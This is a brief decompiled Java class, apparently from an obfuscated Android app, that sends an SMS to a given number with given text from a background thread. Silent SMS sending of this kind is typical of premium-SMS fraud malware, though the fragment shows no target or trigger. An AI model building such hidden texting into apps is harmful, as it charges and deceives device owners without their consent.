package QueiD9ej.ezahS1gi;
public final class udHkT0 extends java.lang.Thread {
    private String A8xb;
    private String UgmlJgeQci;

    public udHkT0(String p1, String p2)
    {
        this.A8xb = p1;
        this.UgmlJgeQci = p2;
        return;
    }

    public final void run()
    {
        android.telephony.SmsManager.getDefault().sendTextMessage(this.A8xb, 0, this.UgmlJgeQci, 0, 0);
        return;
    }
}
